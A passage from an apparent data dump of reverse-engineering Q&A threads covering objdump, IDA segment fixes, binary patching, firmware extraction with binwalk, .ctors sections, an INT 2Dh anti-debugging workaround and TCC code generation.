<p>Instead, if your current webcam isn't working with your linux distro, I would first confirm that you have the proper generic driver, and then edit the generic driver to support your camera. You can do a pull request on the generic driver. </p>

<p>In most cases the communications with these cameras are very simple serial communications. I suspect that triggering an error from the generic driver will be faster than trying to decipher the mac driver. </p>
","8205"
"Deal with obfuscated assembly","1196","","<p>When using objdump I see the following disassembled code:</p>

<pre><code>8049436:    89 04 24                mov    DWORD PTR [esp],eax
8049439:    e8 52 f7 ff ff          call   8048b90 &lt;gtk_entry_get_text@plt&gt;
804943e:    89 44 24 24             mov    DWORD PTR [esp+0x24],eax
8049442:    eb 01                   jmp    8049445 &lt;gtk_grid_new@plt+0x6c5&gt;
8049444:    1d c7 04 24 0b          sbb    eax,0xb2404c7
8049449:    00 00                   add    BYTE PTR [eax],al
804944b:    00 e8                   add    al,ch
804944d:    0f f7 ff                maskmovq mm7,mm7
8049450:    ff eb                   jmp    &lt;internal disassembler error&gt;
</code></pre>

<p>This is using an obfuscation technique to make the disassembling harder. When I check in gdb I see the real code at 0x8049445:</p>

<pre><code>(gdb) &gt; x/10i 0x8049445
0x8049445:  mov    DWORD PTR [esp],0xb
0x804944c:  call   0x8048b60 &lt;raise@plt&gt;
0x8049451:  jmp    0x8049454
0x8049453:  sbb    eax,0xfff8a7e8
</code></pre>

<p>Now, my question is: is it possible to tell objdump that the byte at 0x8049444 can be ignored for the purpose of disassembly? One obvious way is to actually patch the file, but is there another way?</p>

<p>And if not with objdump, are there other tools that can do that? Though I'd rather stay with the basic tools included with Linux so as to familiarize myself with those better.</p>
","<p>Most tools don't support a 'ignore that byte for disassembly' feature, only IDA, Hopper and a few others do.</p>

<p>The only alternative is to patch the byte at <code>8049444</code> with a <code>90 NOP</code>, or change your mind and not rely on basic tools.</p>
","2919"
"decoding blob into original file","1196","","<p>I have a program which converts file to blob in sqlite database. It uses QT framework. I can normally save the file from the database but only through its GUI (which is really painful).
I want to be able to decode the blob in sqlite to the original file.
I have attached the original and encoded file here <a href=""https://drive.google.com/file/d/0B2BLH3kVAYbgQVVzTTFRRzNHMlk/view?usp=sharing"" rel=""nofollow"">link</a>
(click download button)
It is likely using qtarray and qstring but I am not sure. It seems also that the header is removed while encoding.
I would really appreciate your help. </p>
","<p>The blob file is compressed with zlib, so you have to decompress it first. The first 4 bytes of the blob is the decompressed size and the compressed content start at 6th byte.<p>
After the decompression you got binary file starting with <code>0xDEADBEAF</code> (in big-endian, marked as yellow in the figure). After it you can find some header parameters, one of the <code>0x22</code> (marked as green) is the number of rows.<p>
After the header you can find the row data as 32-bit float (<a href=""http://www.binaryconvert.com/result_float.html?hexadecimal=BFBF589F"" rel=""noreferrer"">see float conversion here</a>):</p>

<pre><code>6 = 06
0.756431 = 0x3f41a578
-1.494892 = 0xbfbf589f
</code></pre>

<p><img src=""https://i.stack.imgur.com/Chx2n.png"" alt=""Decompressed blob""></p>
","9000"
"How to recover information stored in .ctors section?","1193","","<p>Test is on x86, 32-bit Linux. I am using <code>g++</code> 4.6.3 and <code>objdump</code> 2.22</p>

<p>Here is a simple C++ code I am working on:</p>

<pre><code>#include &lt;iostream&gt;

using namespace std;

main()
{
    cout &lt;&lt; ""Hello World!"" &lt;&lt; endl;
    return 0;
}
</code></pre>

<p>When I compile it into assembly code using :</p>

<pre><code>gcc -S hello.cc
</code></pre>

<p>I can find out a <code>ctors</code> section in the <strong>hello.s</strong> below:</p>

<pre><code>.section    .ctors,""aw"",@progbits
.align 4
.long   _GLOBAL__sub_I_main
.weakref    _ZL20__gthrw_pthread_oncePiPFvvE,pthread_once
.weakref    _ZL27__gthrw_pthread_getspecificj,pthread_getspecific
.weakref    _ZL27__gthrw_pthread_setspecificjPKv,pthread_setspecific
.weakref    _ZL22__gthrw_pthread_createPmPK14pthread_attr_tPFPvS3_ES3_,pthread_create
.weakref    _ZL20__gthrw_pthread_joinmPPv,pthread_join
.weakref    _ZL21__gthrw_pthread_equalmm,pthread_equal
.weakref    _ZL20__gthrw_pthread_selfv,pthread_self
.weakref    _ZL22__gthrw_pthread_detachm,pthread_detach
.weakref    _ZL22__gthrw_pthread_cancelm,pthread_cancel
.weakref    _ZL19__gthrw_sched_yieldv,sched_yield
.weakref    _ZL26__gthrw_pthread_mutex_lockP15pthread_mutex_t,pthread_mutex_lock
.weakref    _ZL29__gthrw_pthread_mutex_trylockP15pthread_mutex_t,pthread_mutex_trylock
.weakref    _ZL31__gthrw_pthread_mutex_timedlockP15pthread_mutex_tPK8timespec,pthread_mutex_timedlock
.weakref    _ZL28__gthrw_pthread_mutex_unlockP15pthread_mutex_t,pthread_mutex_unlock
.weakref    _ZL26__gthrw_pthread_mutex_initP15pthread_mutex_tPK19pthread_mutexattr_t,pthread_mutex_init
.weakref    _ZL29__gthrw_pthread_mutex_destroyP15pthread_mutex_t,pthread_mutex_destroy
.weakref    _ZL30__gthrw_pthread_cond_broadcastP14pthread_cond_t,pthread_cond_broadcast
.weakref    _ZL27__gthrw_pthread_cond_signalP14pthread_cond_t,pthread_cond_signal
.weakref    _ZL25__gthrw_pthread_cond_waitP14pthread_cond_tP15pthread_mutex_t,pthread_cond_wait
.weakref    _ZL30__gthrw_pthread_cond_timedwaitP14pthread_cond_tP15pthread_mutex_tPK8timespec,pthread_cond_timedwait
.weakref    _ZL28__gthrw_pthread_cond_destroyP14pthread_cond_t,pthread_cond_destroy
.weakref    _ZL26__gthrw_pthread_key_createPjPFvPvE,pthread_key_create
.weakref    _ZL26__gthrw_pthread_key_deletej,pthread_key_delete
.weakref    _ZL30__gthrw_pthread_mutexattr_initP19pthread_mutexattr_t,pthread_mutexattr_init
.weakref    _ZL33__gthrw_pthread_mutexattr_settypeP19pthread_mutexattr_ti,pthread_mutexattr_settype
.weakref    _ZL33__gthrw_pthread_mutexattr_destroyP19pthread_mutexattr_t,pthread_mutexattr_destroy
</code></pre>

<p>However, when I assembly the asm code, producing an exe file and use the <code>objdump</code> produce the <code>ctors</code> section's contain like this:</p>

<pre><code>objdump -Dr -j .ctors hellocpp
</code></pre>

<p>All I can get is like this:</p>

<pre><code>hellocpp:     file format elf32-i386


Disassembly of section .ctors:

08049efc &lt;__CTOR_LIST__&gt;:
 8049efc:   ff                      (bad)  
 8049efd:   ff                      (bad)  
 8049efe:   ff                      (bad)  
 8049eff:   ff 00                   incl   (%eax)

08049f00 &lt;__CTOR_END__&gt;:
 8049f00:   00 00                   add    %al,(%eax)
 ...
</code></pre>

<p>Currently I am trying to recover the content of some ELF binaries compiled from <code>c++</code> program.. </p>

<p>So I am wondering if there is a way to get the content of <code>ctors</code> which equals to what <code>g++</code> produced?</p>

<h3>Update:</h3>

<p>Thanks a lot for @Igor's help. But I am still trapped in looking for <code>class's</code> <code>constructor</code> and <code>destructor</code>  info from ELF binary.</p>

<p>When evolving <code>class</code> definition, g++ would produce these info in the <code>.ctors</code> section:</p>

<pre><code>    .globl  _ZN8ComputerC1Ev
    .set    _ZN8ComputerC1Ev,_ZN8ComputerC2Ev
    .globl  _ZN8ComputerD1Ev
    .set    _ZN8ComputerD1Ev,_ZN8ComputerD2Ev
</code></pre>

<p>Generally <code>_ZN8ComputerC2Ev</code> is the name of a class's constructor while <code>_ZN8ComputerD2Ev</code> is its  destructor.</p>

<p>However, I just can not find corresponding info in the <code>objdump</code> dumped <code>.ctors</code> or <code>.init_array</code> sections.. I also tried <code>.eh_frame</code> and <code>gcc_except_table</code>, but the information dumped is massive.. I can not figure out the meaning of those information..</p>

<p>Could anyone give me guide? </p>
","<p>The <code>.ctors</code> section is a list of pointers terminated with -1 (0xFFFFFFFF), so it does not make sense to disassemble it. If you rearrange the bytes as data, you get:</p>

<pre><code>__CTOR_LIST__: .long 0xffffffff
__CTOR_END__:  .long 0x00000000
</code></pre>

<p>So, for whatever reason, the resulting exe does not actually use the <code>.ctors</code> section. I suspect the linker instead placed the pointers into the new-style <code>.init_array</code> section. Note that it is, again, a list of pointers, and not code.</p>

<p><strong>Edit</strong>:</p>

<p>The <code>.ctors</code> or <code>.init_array</code> sections only contain so-called <em>constructor functions</em> - functions that need to be executed at startup, before the <code>main()</code> itself. These are usually compiler-generated functions that perform construction of global objects (such as <code>cin</code>, <code>cout</code> etc.), or other startup-related tasks. You can, in fact, add your own functions to that list using <a href=""https://stackoverflow.com/questions/2053029/how-exactly-does-attribute-constructor-work""><code>__attribute__((constructor))</code></a>.</p>

<p>What does <strong>not</strong> go there are general C++ class constructors - there is no need to execute those on startup. They will be called when and if you construct an object of a specific class - e.g. by declaring a variable or calling <code>operator new</code>.</p>
","6286"
"Patching jmp instructions on amd64 with IDA","1192","","<p>For experimentation, while waiting for vendor to fix bug, wanted to try and eliminate a crash that occurs on occasion. Up till now I've only done patching replacing existing code, not trying to insert additional code.</p>

<p>Original</p>

<pre><code>.text:000000018000A260                 cmp     [rax], r12d &lt;- RAX=0, crashes program
.text:000000018000A263                 jz      short loc_18000A271
.text:000000018000A265                 cmp     dword ptr [rax], 6
.text:000000018000A268                 jnz     short loc_18000A276
.text:000000018000A26A                 cmp     ecx, 40h
</code></pre>

<p>And further on:</p>

<pre><code>.text:000000018000A21B                 mov     rcx, [rsp+388h+var_350]
.text:000000018000A220                 call    cs:WindowsDeleteString
.text:000000018000A226                 mov     [rsp+388h+var_350], r15
.text:000000018000A22B                 mov     rbx, [rsp+388h+var_348]
</code></pre>

<p>I want to insert some new instruction, changing to jmp to patched code</p>

<pre><code>.text:000000018000A260                 jmp     &lt;patched code&gt;
</code></pre>

<p>Patched Code Idea - I can't find much suitable place to insert code - so was thinking of shortening some non-essential strings in .rdata section to insert this code - Is there any issue with this? Essentially what I am trying to do is if RAX = 0 , skip over the use of [rax]</p>

<pre><code>cmp rax,0
jz .text:000000018000A21B ; The code point past using [rax]
cmp [rax], r12d
jmp .text:000000018000A263 ; Continue program execution normally
</code></pre>

<p>Now it seems IDA ""Assemble"" doesn't always work, for example cmp rax,0 it says ""Invalid Operand"" So I had to patch bytes instead</p>

<pre><code>48 83 F8 00 = cmp rax,0
</code></pre>

<p>Is there a way to get the ""assemble"" in IDA to reference my jump locations, using the location references in IDA. Or is there a suggested method to calculate how to build my jmp/jz instructions.</p>
","<blockquote>
  <p>Patched Code Idea - I can't find much suitable place to insert code -
  so was thinking of shortening some non-essential strings in .rdata
  section to insert this code - Is there any issue with this?</p>
</blockquote>

<p>You should not use the .rdata section as it's usually not not marked for execution of code. If you ignore this you will trigger DEP and changing the segment to allow code executions is obviously not recommended as well.</p>

<p>I would suggest to add a segment, extend the current segment or find some empty space in the current segment (maybe there's align bytes at the end). </p>

<blockquote>
  <p>Is there a way to get the ""assemble"" in IDA to reference my jump
  locations, using the location references in IDA. Or is there a
  suggested method to calculate how to build my jmp/jz instructions.</p>
</blockquote>

<p>You can just take the difference between the two virtual addresses and use a relative jump (0xE9). </p>

<blockquote>
  <p>Now it seems IDA ""Assemble"" doesn't always work, for example cmp rax,0
  it says ""Invalid Operand""</p>
</blockquote>

<p>This feature is not supported for AMD64 according to Hex Rays:</p>

<blockquote>
  <p>The assembler command is supported for only a few processors, only a
  few instructions. We do not plan to extend this feature, sorry</p>
</blockquote>
","8702"
"How to extract the filesystem from a I240w-A firmware","1189","","<p>I am trying to extract this <a href=""ftp://113.160.47.142/firmware-ONT/I240w-A/FE54869ACAD07"" rel=""nofollow"">ONT I240w-A firmware</a> and binwalk reports some LZMA compressed data (dump below) but the fact the all of them read ""uncompressed size: -1 bytes"" makes me suspect they are false positives.  Is this a correct assumption?  Can someone provide any suggestions on how to unpack this file?</p>

<pre><code>DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: -1 bytes
64613         0xFC65          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: -1 bytes
663307        0xA1F0B         LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: -1 bytes
1277775       0x137F4F        VMware4 disk image
1419798       0x15AA16        LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: -1 bytes
2167742       0x2113BE        LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: -1 bytes
2966631       0x2D4467        LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: -1 bytes
3649662       0x37B07E        LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: -1 bytes
4619541       0x467D15        LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: -1 bytes
5626408       0x55DA28        LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: -1 bytes
6526915       0x6397C3        LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: -1 bytes
7352076       0x702F0C        LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: -1 bytes
8028944       0x7A8310        LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: -1 bytes
8790601       0x862249        LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: -1 bytes
9628455       0x92EB27        LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: -1 bytes
10380524      0x9E64EC        LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: -1 bytes
11136805      0xA9EF25        LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: -1 bytes
11917494      0xB5D8B6        LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: -1 bytes
12590672      0xC01E50        LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: -1 bytes
13354487      0xCBC5F7        LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: -1 bytes
13954117      0xD4EC45        LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: -1 bytes
13955290      0xD4F0DA        uImage header, header size: 64 bytes, header CRC: 0xED8A6EC8, created: 2013-08-16 11:32:36, image size: 2369813 bytes, Data Address: 0x80010000, Entry Point: 0x80014110, data CRC: 0xB66029EE, OS: Linux, CPU: MIPS, image type: OS Kernel Image, compression type: gzip, image name: ""Linux Kernel Image""
13955354      0xD4F11A        gzip compressed data, maximum compression, from Unix, NULL date (1970-01-01 00:00:00)
16325167      0xF91A2F        LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: -1 bytes
16476952      0xFB6B18        LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: -1 bytes
</code></pre>
","<p>All the LZMA entries appear to be valid, and decompress to tar archives (-1 is a valid file size, and is used when the compressor doesn't know the size of the original data, such as when the data is passed via stdin).</p>

<p>Although the tar file name is the same for most of them (""tmp_file""), the un-tar'd data is different; there appears to be a UBIFS file system in there, as well as plenty of plain text shell scripts and the like:</p>

<pre><code>Scan Time:     2015-07-27 23:33:31
Target File:   /home/eve/Downloads/_FE54869ACAD07.extracted/_6397C3.extracted/tmp_file
MD5 Checksum:  63a711b8ee1cdbb886d572dd610f7a2d
Signatures:    332

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
40361         0x9DA9          Executable script, shebang: ""/bin/sh""
90177         0x16041         Executable script, shebang: ""/bin/sh""
113593        0x1BBB9         Executable script, shebang: ""/bin/sh""
197217        0x30261         Executable script, shebang: ""/bin/sh""
203169        0x319A1         Unix path: /opt/tools/broadlight/sysroot)I
297561        0x48A59         Executable script, shebang: ""/bin/sh""
376433        0x5BE71         Executable script, shebang: ""/bin/sh""
388553        0x5EDC9         Executable script, shebang: ""/bin/sh""
396018        0x60AF2         Unix path: /../sysroot/usr/include
415009        0x65521         Executable script, shebang: ""/bin/sh""
415617        0x65781         Executable script, shebang: ""/bin/sh""
431897        0x69719         Executable script, shebang: ""/bin/sh""
436698        0x6A9DA         HTML document header
504153        0x7B159         Executable script, shebang: ""/bin/sh""
629257        0x99A09         Executable script, shebang: ""/bin/sh""
629673        0x99BA9         Executable script, shebang: ""/bin/sh""
630169        0x99D99         Executable script, shebang: ""/bin/sh""
630889        0x9A069         Executable script, shebang: ""/bin/sh""
678623        0xA5ADF         Unix path: /x86-linux2/../sysroot/usr/include


Scan Time:     2015-07-27 23:33:31
Target File:   /home/eve/Downloads/_FE54869ACAD07.extracted/_862249.extracted/tmp_file
MD5 Checksum:  099fbe96cd12990a19fe55e2dc4b651c
Signatures:    332

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             UBIFS superblock node, CRC: 0xD1C96755, flags: 0x0, min I/O unit size: 2048, erase block size: 129024, erase block count: 157, max erase blocks: 288, format version: 4, compression type: lzo
129024        0x1F800         UBIFS master node, CRC: 0xCB83706A, highest inode: 1330, commit number: 0
258048        0x3F000         UBIFS master node, CRC: 0xC7B38577, highest inode: 1330, commit number: 0
</code></pre>

<p>I don't know of any good tools to work with UBIFS though, maybe someone else here has some suggestions?</p>
","9472"
"ida pro stack variables in hex view","1186","","<p>You have the IDA View and Hex View right. When on IDA View you select an instruction you can see the instruction selected in Hex View as well. However, if you select a ""data instruction"" like ""Format          = dword ptr -10h"" which is a stack variable, you don't see it in the hex view. It doesn't select the bytes corresponding to the variable definition. I mean I know the variable is going to be there in memory but somewhere on the hex view should tell me ""hey allocate this stack variable"" but it doesn't.</p>

<p>It's probably obvious by now, I'm a beginner in reverse engineering, I've been reading the book from <a href=""http://beginners.re/"" rel=""nofollow"">http://beginners.re/</a> . While I do know some assembly and have been able to reverse simple things, I have these knowledge gaps I'd like to fill. Thank you!</p>
","<p>Stack variables live in the stack's address space, not in the module's address space. Thus, there's nothing that the Hex View could show you statically.</p>
","8126"
"IDA segmentation problem","1186","","<p>In the program I'm trying to reverse engineer, originally IDA only created three segments: <code>CODE</code>, <code>DATA</code> and <code>.idata</code>.</p>

<p>Using the information from the compiler source code (<a href=""http://pastebin.com/ParJ3683"" rel=""nofollow"">http://pastebin.com/ParJ3683</a> lines 30-78), I determined that infact DATA was concatenated out of (at least) four segments, <code>DATA</code>,<code>INITDATA</code>,<code>EXITDATA</code> and <code>BSS</code>.</p>

<p>So I created three new segments with the specified alignments (word/dword) and the appropriate boundaries; while all data appeared in the correct segment bounds, all references to what had been in the DATA segment and is now in BSS are now totally messed up:</p>

<pre><code>CODE:00401A8A                 push    ds:globalErrorMessagesCaption[eax*4] ; lpCaption
</code></pre>

<p>turned into </p>

<pre><code>CODE:00401A8A                 push    dword ptr ds:(algn_481049+187h)[eax*4] ; lpCaption
</code></pre>

<p>The section header is</p>

<pre><code>_BSS:00481106 ; Segment type: Pure data
_BSS:00481106 _BSS            segment dword public 'DATA' use32
_BSS:00481106                 assume cs:_BSS
_BSS:00481106                 ;org 481106h
</code></pre>

<p>What has gone wrong here and how can I fix it?</p>
","<p>Short answer: your newly created segments probably have an invalid selector value of 0, and things should start working again as soon as you set the selector to a valid value (e.g. <code>SetSegmentAttr(here, SEGATTR_SEL, 1)</code> at the command prompt). The reason is that all selectors created by IDA for a PE32(+) have the same base and are mostly equivalent.</p>

<p>Long answer:</p>

<p>There are certain differences between recent IDA versions in the way segment editing via the UI works. Segment editing via the UI can cause complex operations under the hood, and the resulting behaviour is not always intuitive. That's why I'd rather not give a solution in terms of UI operations.</p>

<p>The segment editing functions available in IDC and Python are much simpler and straightforward, and they can be invoked from IDA's command prompt (including symbolic names for flag values, like SEGMOD_KEEP). For trickier stuff I find it most convenient to compose my own operations as named snippets in the code snippet editor (Shift-F2). With a suitable Jump() at the end of the operation - to position the cursor on the most likely candidate for the next operation - this makes it easy to get a lot of stuff done in no time flat. </p>

<p>The IDC/Python segment editing functions are slightly better documented than the whole UI stuff and, being simpler, they are easier to get a handle on by way of experimentation. And much less prone to nasty surprises. If bad things have happened - as in your case - they can often be repaired by probing a working example in one IDA instance with commands like this:</p>

<pre><code>GetSegmentAttr(here, SEGATTR_FLAGS)
</code></pre>

<p>and then switching to the other IDA instance containing the 'patient' and poking in the newly discovered value:</p>

<pre><code>SetSegmentAttr(here, SEGATTR_FLAGS, 0x10)
</code></pre>

<p>Since both IDA instances share the same command prompt history, entering the second command is as simple as hitting the up arrow and modifying the query that was entered in the other IDA instance. In your case things will probably start working again if you set <strong>SEGATTR_SEL</strong> for the newly created segments to the same value as an existing (and hence correctly configured) segment. To find the magic flags and their names I prefer grepping <code>$(IDA)/idc/idc.idc</code> over consulting the help file, since idc.idc tends to be more comprehensive and more up to date.</p>

<p>Note: view windows like ""Program Segmentation"" do not refresh on their own but they can be refreshed by hitting their hotkey again (e.g. Shift-F7 for ""Program Segmentation""), and also by entering ""RefreshLists()"" at the command prompt. Also, all the stuff I wrote here is probably far from optimal, but it's the best I am able to do based on my limited knowledge and existing documentation...</p>

<p>Last but not least, segments are not very significant for PE32(+) targets with their flat address spaces. I find them convenient for tagging ranges of code as belonging to a certain module (e.g. 'CRT', 'Lua', whatever) but it is not really necessary to create a faithful representation of the segments contained in the source code, since they are mostly for the benefit of the linker and end up being merged into a tiny number of PE sections.</p>
","6919"
"What are the differences between BitBlaze and BAP?","1185","","<p><a href=""http://bitblaze.cs.berkeley.edu/"">BitBlaze</a> and <a href=""http://bap.ece.cmu.edu/"">BAP</a> are two platforms to perform binary analysis. And, if I understand well, they are sharing lots of common features. What are their respective main features and in what do they differ from each other ?</p>
","<p>BAP is mostly a rewrite of BitBlaze, so feature-wise there are many common features.  However, many of these have been re-written or re-designed for BAP.</p>

<p><strong>Common features:</strong></p>

<ul>
<li>Lifting of usermode, x86 instructions</li>
<li>Datafow analysis module</li>
<li>Dominator analysis</li>
<li>CFG and SSA representations</li>
<li>Optimization framework</li>
<li>Verification condition generation</li>
<li>Dependency graphs</li>
<li>Slicing</li>
</ul>

<p>I am a BAP developer, so I can mainly attest to what is new in BAP since we split.  However, I don't think BitBlaze has (publicly) added new features since then.</p>

<p><strong>New in BAP</strong>:</p>

<ul>
<li>Formally defined semantics for the IL</li>
<li>PIN-based user-level taint tracking and tracing tool</li>
<li>Integration with LLVM</li>
<li>Native instruction lifting (i.e., in OCaml)</li>
</ul>

<p><strong>Only in BitBlaze:</strong></p>

<ul>
<li>TEMU system-level taint tracking and tracing tool</li>
</ul>
","1666"
"Reverse engineering windows service","1184","","<p>I'm trying to reverse engineer a driver that consists of 2 components, a windows service and a control panel application. My goal of reverse engineering is to replace the control panel with my own program.</p>

<p>Now as far as I can see I have a few possible approaches:</p>

<ol>
<li>I try to reverse engineer the control panel, and discover the calls sent. But this panel consists of a lot of bloatware.</li>
<li>I try to reverse engineer the service, and discover the input needed. But this service also handles other (unknown) functions.</li>
<li>I try to catch the communication between the panel and the service.</li>
</ol>

<p>Now 3 would be the easiest approach, but I have no idea if this is technically possible. Then I tried option 2, but i can only statically analyze the exe, Since dynamic analysis causes it to crash prematurely. Option 1 seems to be the most logical one, and this was the first I tried, but I can't really find an interesting starting point.</p>

<p>Is there anyone who can point me in the right direction. I have some reverse engineering experience from crackme's and applications, but this is my first attempt at reversing a driver.</p>
","<p>If you goal is ultimately to control the service, it make more sense to reverse it versus reversing control panel. Who knows, you might find functionality you were not aware of. The key part of reversing windows service is to realize that it runs within the context of the <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms685150%28v=vs.85%29.aspx"" rel=""nofollow noreferrer""><strong>Service Control Manager</strong></a>, and simply running the executable will not work. There are several major components of any windows service, that you need to be aware of. I have already given an answer to <a href=""https://reverseengineering.stackexchange.com/questions/2235/how-does-services-exe-trigger-the-start-of-a-service/2237#2237""><strong>How does services.exe trigger the start of a service?</strong></a> question. It describes inner workings of a windows service.</p>

<p>It is very much possible to reverse a Windows service both dynamically and statically as long as you understand underlining concepts. If you run your service in context of command prompt, it will fail. Every Windows service by design has to call to Service Control Manager, if that call fails it means the service is not executed within the SCM. It is expected to fail being executed outside of the SCM. If services expects input, you will have to figure out what it needs. Firstly, you will need to locate Service Worker Thread. Thereafter, locating part of the way it communicates to control panel should be easy. </p>
","2477"
"Handling INT 2D anti-debugger technique in IDA Pro","1176","","<p>I'm analyzing a PE file using <code>IDA Pro</code> that is using <code>int 2Dh</code> technique as anti debugging:  </p>

<pre><code>CODE:00455050 push    ebp
CODE:00455051 mov     ebp, esp
CODE:00455053 push    ecx
CODE:00455054 push    ebx
CODE:00455055 push    esi
CODE:00455056 push    edi
CODE:00455057 xor     eax, eax
CODE:00455059 push    ebp
CODE:0045505A push    offset loc_455076
CODE:0045505F push    dword ptr fs:[eax]
CODE:00455062 mov     fs:[eax], esp
CODE:00455065 int     2Dh             ; Windows NT - debugging services: eax = type
CODE:00455067 inc     eax
CODE:00455068 mov     [ebp+var_1], 1
CODE:0045506C xor     eax, eax
CODE:0045506E pop     edx
CODE:0045506F pop     ecx
CODE:00455070 pop     ecx
CODE:00455071 mov     fs:[eax], edx
CODE:00455074 jmp     short loc_455084
</code></pre>

<p>How should I config IDA Pro to handle this interrupt/exception in dynamic analyzing?<br>
I'm Using the local win32 debugger</p>
","<p>The code is expecting an exception to occur, which will happen in the absence of a debugger.  If a debugger is present, the breakpoint exception will usually be suppressed by the debugger, and execution will continue at either 0x455067 or 0x455068, depending on the debugger.</p>

<p>You have two simple choices: one choice is that you could just let execution reach 0x455084 and then change var_1 back to zero (or whatever value that it had originally).  What you don't want is for it to have the value of ""1"".</p>

<p>The other choice is to change the byte at 0x455065 from 0xCD to 0xFF (for example) and then let that execute.  This sequence will cause an exception to occur, which is really what you want to happen (note that the exception code won't be correct, so you'll need to watch if the code checks for a 0x80000003, and take that code path).  The execution will be transferred to the handler at 0x455076, at which point you can change the byte at 0x455065 back to 0xCD (in case the code is self-checking), and then resume debugging.</p>
","6270"
"How to find all functions in DLL","1175","","<p>I'm looking for a way to get the addresses of all the functions in a DLL in the .text section. Is there a way to do it without using a disassembler and moving through the commands? How does IDA know to identify all the functions, even if their start is not the regular ""push ebp, mov ebp esp""?</p>

<p>Thanks!</p>
","<p>You can get a list of all <em>exported</em> functions just by reading the PE headers. But, that won't give you any function names, or expected arguments lists (*), and it won't give you any functions that are internal to the DLL.</p>

<p>In the general case, the only thing you can do is start with exported functions, disassemble from there, follow <code>jmp</code>s, and mark everything that's <code>call</code>ed as a new function and process it in the same way that you process the exported stuff. This is basically what IDA does.</p>

<p>As C0000022L mentioned, this is in no way trivial, especially with C++ methods that are never called directly, but only through vtable pointers, which is why even IDA gets this kind of stuff <em>mostly</em> right, but not <em>completely</em> right.</p>

<p>Ida has another feature though, named FLIRT -  it has a database that has signatures of standard library functions for many different compilers. Which is why it can, often, identify standard library function names. But as far as i know, this is a second pass thing; first IDA identifies functions by being called from somewhere, then tries to assign names to those functions using FLIRT. Of course, this helps with standard library functions ONLY, and building this kind of database certainly needs a lot of work as well.</p>

<p>(*) If you're lucky, functions will be exported by name, and if you're very lucky, and the DLL was written in C++, the function name will include the signature. So there are cases when the export list is valuable. But this isn't the generic case, when a function might just be exported by ordinal.</p>
","12439"
"Why is the ecx register used during an inc instruction","1175","","<p>Here's code that performs some arithmetics.</p>

<pre><code>int main(void) {
    int i = 3;
    i++;
    i+= 2;
    return 0;
}
</code></pre>

<p>I compiled it using 32-bit <a href=""http://bellard.org/tcc/"" rel=""nofollow""><code>tcc</code></a> with the following command</p>

<pre><code>tcc -o hello.exe hello.c
</code></pre>

<p>I, then, disassembled it using <a href=""https://www.hex-rays.com/products/ida/support/download_freeware.shtml"" rel=""nofollow"">IDA free edition</a>, and after some time staring at the <code>start</code> of the instructions I realized that the main function that I was looking for is in a subroutine, and going there I see this:</p>

<pre><code>sub_401000 proc near

var_4= dword ptr -4

push    ebp               
mov     ebp, esp           
sub     esp, 4            // allocate 4 bytes on the stack for var i
nop

mov     eax, 3            // i = 3 instructions
mov     [ebp+var_4], eax  // 

mov     eax, [ebp+var_4]  // i++ instructions
mov     ecx, eax          // 
inc     eax               // 
mov     [ebp+var_4], eax  //

mov     eax, [ebp+var_4]  // i+=2 instructions
add     eax, 2            //   
mov     [ebp+var_4], eax  //  

mov     eax, 0           
jmp     $+5              
leave
retn
sub_401000 endp
</code></pre>

<p>I've added my understanding of what's going on in comments on the right for the body of the method that I am interested in.</p>

<p>For example, incrementing the variable would involve moving a value onto a register and then operating on it. I would expect <code>i++</code> to look something like</p>

<pre><code>mov     eax, [ebp+var_4]
inc     eax             
</code></pre>

<p>But the actual instructions involved an extra move</p>

<pre><code>mov     eax, [ebp+var_4]  
mov     ecx, eax         // &lt;----- ?
inc     eax               
</code></pre>

<p>In the add instruction, the extra move isn't there. When I modified the code with a decrement operation, I see that extra move as well.</p>

<p>Is there some purpose for this move from <code>eax</code> to <code>ecx</code> ?</p>

<p>UPDATE:</p>

<p>I am still reading about registers, and from what I've read <code>ecx</code> is used as a counter, but from this code it isn't obvious what it's being used for, if anything.</p>
","<p>TCC was written to be fast and simple without most optimizations. It compiles the program in only one pass and use a very limited number of registers (eax, ecx and edx, I think). So don't suppose for it to be efficient and don't surprise when it does something ""stupidly"".</p>

<blockquote>
  <p>On x86, three temporary registers are used. When more registers are needed, one register is spilled into a new temporary variable on the stack.</p>
</blockquote>

<p><a href=""http://bellard.org/tcc/tcc-doc.html#SEC31"" rel=""nofollow"">http://bellard.org/tcc/tcc-doc.html#SEC31</a></p>

<blockquote>
  <p>TCC generates code in a single pass, and does not perform most of the optimizations performed by other compilers such as GCC. TCC compiles every statement on its own, and at the end of each statement register values are written back to the stack and must be re-read even if the next line uses the values in registers (creating extraneous save/load pairs between statements). TCC uses only some of the available registers (e.g., on x86 it never uses ebx, esi, or edi because they need to be preserved across function calls).[4]</p>
</blockquote>

